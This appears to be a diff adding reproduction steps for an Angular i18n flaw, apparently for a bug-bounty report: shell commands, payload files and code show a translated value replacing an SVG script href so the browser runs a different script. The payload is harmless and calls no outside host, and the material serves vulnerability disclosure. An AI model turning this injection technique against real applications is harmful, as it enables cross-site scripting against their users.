@@ -1,0 +1,138 @@
+Reproduction steps
+
+Create a fresh Angular project:
+
+cd ~/hunt_google_vrp
+
+npx -y @angular/cli@latest new angular-i18n-svg-script-resourceurl-poc \
+  --standalone \
+  --routing=false \
+  --style=css \
+  --skip-git
+
+Enter the project:
+
+cd ~/hunt_google_vrp/angular-i18n-svg-script-resourceurl-poc
+
+Install localize:
+
+npm install @angular/localize
+
+Create payload files:
+
+mkdir -p public
+
+cat > public/safe-empty.js <<'EOF'
+console.log('SAFE_EMPTY_SCRIPT_LOADED');
+EOF
+
+cat > public/svg-script-payload.js <<'EOF'
+document.body.setAttribute('data-xss', 'I18N_TRANSLATED_SVG_SCRIPT_EXECUTED');
+console.log('I18N_TRANSLATED_SVG_SCRIPT_EXECUTED');
+EOF
+
+Replace src/main.ts:
+
+cat > src/main.ts <<'EOF'
+import '@angular/localize/init';
+import {loadTranslations} from '@angular/localize';
+import {bootstrapApplication} from '@angular/platform-browser';
+import {appConfig} from './app/app.config';
+import {App} from './app/app';
+
+loadTranslations({
+  svgScriptHrefUrl: '/svg-script-payload.js',
+  svgScriptXlinkHrefUrl: '/svg-script-payload.js',
+});
+
+bootstrapApplication(App, appConfig).catch((err) => console.error(err));
+EOF
+
+Replace src/app/app.html:
+
+cat > src/app/app.html <<'EOF'
+<h1>Angular i18n ResourceURL injection via SVG script href</h1>
+
+<p>
+  Source template contains a safe script URL:
+  <code>/safe-empty.js</code>
+</p>
+
+<svg width="780" height="180" style="border:1px solid #ccc">
+  <script
+    id="svgScriptHref"
+    i18n-href="@@svgScriptHrefUrl"
+    href="/safe-empty.js">
+  </script>
+
+  <script
+    id="svgScriptXlinkHref"
+    i18n-xlink:href="@@svgScriptXlinkHrefUrl"
+    xlink:href="/safe-empty.js">
+  </script>
+
+  <text x="20" y="40">
+    Angular i18n translated SVG script href test
+  </text>
+</svg>
+
+<pre id="out">Check document.body.getAttribute('data-xss')</pre>
+EOF
+
+Build:
+
+npx ng build --configuration development
+
+Inspect generated JavaScript:
+
+rg -n "svgScriptHref|svgScriptXlinkHref|svg-script-payload|safe-empty|trustConstantResourceUrl|sanitizeResourceUrl|namespaceSVG|domElement\\(.*script" \
+  dist/angular-i18n-svg-script-resourceurl-poc/browser/main.js
+
+Expected generated evidence:
+
+i18n_0 = $localize`:@@svgScriptHrefUrl:/safe-empty.js`;
+
+return [
+  ["width", "780", "height", "180", 2, "border", "1px solid #ccc"],
+  ["id", "svgScriptHref", "href", i18n_0],
+  ["id", "svgScriptXlinkHref", 0, "xlink", "href", "/safe-empty.js"],
+  ["x", "20", "y", "40"],
+  ["id", "out"]
+];
+
+loadTranslations({
+  svgScriptHrefUrl: "/svg-script-payload.js",
+  svgScriptXlinkHrefUrl: "/svg-script-payload.js"
+});
+
+Run the app:
+
+npm start
+
+Open:
+
+http://localhost:4200/
+
+Open browser DevTools console and check:
+
+document.getElementById('svgScriptHref')?.getAttribute('href')
+document.getElementById('svgScriptXlinkHref')?.getAttributeNS('http://www.w3.org/1999/xlink', 'href')
+document.body.getAttribute('data-xss')
+
+Expected result:
+
+document.getElementById('svgScriptHref')?.getAttribute('href')
+// "/svg-script-payload.js"
+
+document.getElementById('svgScriptXlinkHref')?.getAttributeNS('http://www.w3.org/1999/xlink', 'href')
+// "/safe-empty.js" or translated depending on generated path/attribute handling
+
+document.body.getAttribute('data-xss')
+// "I18N_TRANSLATED_SVG_SCRIPT_EXECUTED"
+
+Expected console output:
+
+I18N_TRANSLATED_SVG_SCRIPT_EXECUTED
+SAFE_EMPTY_SCRIPT_LOADED
+
+The important proof is that the source template contains the safe URL /safe-empty.js, but the translated i18n value /svg-script-payload.js is inserted into the SVG script URL and executed by the browser.
